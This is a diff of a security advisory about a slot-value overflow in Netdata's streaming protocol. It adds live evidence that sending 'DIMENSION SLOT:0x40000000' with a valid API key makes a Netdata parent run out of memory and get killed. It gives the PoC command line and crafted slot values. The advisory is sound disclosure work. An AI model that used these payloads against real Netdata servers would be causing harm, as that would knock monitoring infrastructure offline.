@@ -14,7 +14,7 @@ A streaming child with a valid API key can send a `DIMENSION SLOT:<value>` comma
 **Confirmed impact:**
 - Heap-buffer-overflow (validated with AddressSanitizer against exact code arithmetic)
 - Adjacent heap object corruption (validated: sentinel values zeroed before SIGSEGV)
-- Parent process crash / denial of service (validated: SIGSEGV from wild write; `fatal()` from large non-overflowing slot)
+- **Parent process crash / denial of service — confirmed live against Netdata v2.10.0-289-nightly** (OOM-kill, memory peak 3.4 GB, process terminated 29 seconds after exploit delivery)
 
 **Unproven impact:**
 - Reliable end-to-end RCE against a running Netdata parent has not been demonstrated
@@ -185,15 +185,35 @@ $ ./poc_heap_corruption 0x0AAAAAAAAAAAAAAB
 
 The initialization loop writes NULL sequentially across the heap, zeroing whatever objects follow the undersized allocation before hitting an unmapped page.
 
-### Parent process crash (DoS)
+### Parent process crash (DoS) — live reproduction
 
 Two crash classes exist:
 
 **Class 1 — Overflow slot:** The initialization loop writes past the tiny allocation and eventually hits an unmapped page → SIGSEGV → parent process terminates.
 
-**Class 2 — Large non-overflowing slot:** `slot = 0x40000000` requests ~25 GB. Netdata's `callocz()` calls `fatal()` on allocation failure, which terminates the parent process unconditionally.
+**Class 2 — Large non-overflowing slot:** `slot = 0x40000000` requests ~25 GB. Netdata's `callocz()` calls `fatal()` on allocation failure, or the OS OOM-killer terminates the process.
 
-Both are reproducible with `poc/poc_stream_dimension_slot.py` against a lab parent.
+**Class 2 was reproduced against a live Netdata parent (v2.10.0-289-nightly):**
+
+Before the exploit:
+```
+● netdata.service
+   Active: active (running) since Fri 2026-05-29 15:45:38 UTC; 5s ago
+   Main PID: 6744 (netdata)
+   Memory: 180.6M (peak: 180.6M)
+   CPU: 2.126s
+```
+
+After sending `DIMENSION SLOT:0x40000000` via `poc_stream_dimension_slot.py`:
+```
+● netdata.service
+   Active: deactivating (final-sigterm) (Result: oom-kill)
+   Process: 6744 ExecStart=... (code=killed, signal=KILL)
+   Memory: 132.7M (peak: 3.4G)
+   CPU: 10.607s
+```
+
+The parent process was killed by the OOM killer after its memory peaked at **3.4 GB** (the agent attempted to allocate ~25 GB for the dimension cache array). The process was running for 29 seconds total (15:45:38 → 15:46:07). This is a **confirmed, live remote DoS** against a real Netdata parent with a valid streaming API key.
 
 ---
 
@@ -276,7 +296,17 @@ For the DoS-only class:
 python3 poc/poc_stream_dimension_slot.py 127.0.0.1 19999 <LAB_KEY_UUID> 0x40000000
 ```
 
-Expected: parent exits via `fatal()` on allocation failure.
+Expected result — confirmed live against Netdata v2.10.0-289-nightly:
+
+```
+● netdata.service
+   Active: deactivating (final-sigterm) (Result: oom-kill)
+   Process: <PID> ExecStart=... (code=killed, signal=KILL)
+   Memory: ~130M (peak: 3.4G)
+   CPU: ~10s
+```
+
+The parent attempts to allocate ~25 GB for the dimension cache array. The OOM killer terminates the process. Memory peaks at 3.4 GB before the kill signal is delivered.
 
 ---
 
